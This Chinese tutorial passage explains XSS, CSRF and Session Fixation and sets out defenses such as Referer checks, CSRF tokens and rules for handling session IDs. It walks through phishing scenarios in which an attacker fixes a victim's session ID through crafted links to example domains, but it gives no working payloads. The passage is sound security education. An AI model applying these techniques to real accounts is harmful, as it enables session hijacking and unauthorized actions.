2、XSS（跨站脚本攻击）

跨站脚本（Cross-site scripting，通常简称为：XSS）是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。

2.1、常用的 XSS 攻击手段和目的

  • 盗用cookie，获取敏感信息。
  • 利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。
  • 利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。
  • 利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。
  • 在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。

2.2、XSS 的分类

  • 持久性XSS

    主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来，攻击者在相关页面输入恶意的脚本数据后，用户浏览此类页面时就可能受到攻击。这个流程简单可以描述为:恶意用户的Html输入Web程序->进入数据库->Web程序->用户浏览器。

  • 反射性XSS

    主要做法是将脚本代码加入URL地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。

3、CSRF（跨站请求伪造）

跨站请求伪造（Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF，是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。

这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。
透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。

3.2、防范 CSRF

  1. 检查Referer字段
    HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于www.examplebank.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于www.examplebank.com之下，这时候服务器就能识别出恶意的访问。

    这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。

  2. 添加校验token
    由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验token的值为空或者错误，拒绝这个可疑请求。

4、Session Fixation

Session Fixation 攻击也是一种常见的可以应用于WEB 的攻击。

一些网站在登录后会返回给用户一个SessioniID来标明用户的身份，当黑客拿到这个ID后，就相当于拿到了用户的身份，进而可以执行相关的操作。

下面我们通过维基百科给出的相关栗子来具体了解Session Fixation.

4.1、攻击场景1：服务器接收任意的SessionID

  1. Mallory 发现http://unsafe.example.com/可以接收任意的SessionID，并且SessionID是以请求参数的方式提交到服务器的，同时服务器没有对SessionID的安全校验，也就是说http://unsafe.example.com/是不安全的。
  2. 于是Mallory 给 Alice 发送了一封邮件：”Hey, check this out, there is a cool new account summary feature on our bank, http://unsafe.example.com/?SID=I_WILL_KNOW_THE_SID"。Mallory 正在试图将SessionID 固定为”I_WILL_KNOW_THE_SID”。
  3. Alice 对这个网站很感兴趣，并登陆了自己的账号。
  4. 由于Alice 已经登陆账号并把SID：”I_WILL_KNOW_THE_SID”提交至服务器，因此这个SID 就是 Alice 身份的标识了。
  5. Mallory 就可以使用SID：”I_WILL_KNOW_THE_SID”来无限制的访问 Alice 的账号了。

4.2、攻击场景2：服务器只接收服务器产生的SessionID

  1. Mallory 访问http://vulneralbe.example.com/ 并登陆后，获得SessionID:“0D6441FEA4496C2”。
  2. 于是 Mallory 又给 Alice 发送了一封邮件：”Check out this new cool feature on
    130 our bank, http://vulnerable.example.com/?SID=0D6441FEA4496C2."，邮件中包含了刚刚获得的SID。
  3. Alice 使用SessionID: “0D6441FEA4496C2”登陆了。
  4. Mallory 就可以使用SID：”0D6441FEA4496C2”来无限制的访问 Alice 的账号了。

4.3、攻击场景3：服务器接收跨子域名的Cookie

  1. 网站www.example.com将子域名移交给不可信的第三方。
  2. Mallory 控制了其中的一个子域名：evil.example.com，然后诱导Alice 访问了这个网站。
  3. 在Alice 访问这个网站后，以域名为”.example.com”的cookie就存在了 Alice 的浏览器中。
  4. 当 Alice 访问网站www.example.com时，前面产生的cookie会被发送到服务器，这样 Alice 就拥有了基于 Mallory 的cookie 而生成的Session。
  5. 如果Alice 登录了，Mallory 就可以无限制的访问 Alice 的账户了。

4.4、防范 Session Fixation

  1. 不要接收来自Get/Post请求中的身份识别信息；
  2. 每次请求都产生新的SessionID；
  3. 只接收服务器产生的SessionID；
  4. 为SessionID设置过期时间；
  5. 如果Referrer可以，立即销毁SessionID；
  6. 验证其他信息在整个会话中是否一致。
